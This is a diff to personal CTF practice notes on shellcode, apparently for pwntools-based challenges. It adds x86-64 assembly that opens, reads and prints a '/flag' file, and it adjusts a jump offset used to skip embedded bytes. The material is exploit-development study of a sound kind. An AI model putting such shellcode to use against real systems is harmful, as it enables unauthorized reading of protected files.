@@ -27,6 +27,34 @@ shellcode = pwn.asm('''
 ''')
 ```
 
+### read + write flag (practice-2)
+```c
+    # fd_flag = open("/flag", O_RDONLY)
+    mov rdi, <address of flag_file>;
+    mov rsi, 0;
+    mov rax, 2;
+    syscall;
+
+    # read fd_flag into flag_buffer
+    mov rdi, rax;
+    mov rax, 0;
+    mov rsi, <address of flag_buffer>;
+    mov rdx, 100;       
+    syscall;
+
+    # write flag_buffer to stdout
+    mov rax, 1;
+    mov rdi, 1;
+    mov rsi, <address of flag_buffer>;
+    mov rdx, 100;
+    syscall;
+                             
+    ret;
+string:
+    .string "/flag"
+```
+
+
 ### send /flag 1
 - overview:
 ```c
@@ -141,7 +169,7 @@ shellcode = pwn.asm('''
 ```
 shellcode = pwn.asm('''             
     nop; # do sth
-    jmp $+2;
+    jmp $+4;
     .byte 0x11, 0x22;
     nop; # do sth
 ''')
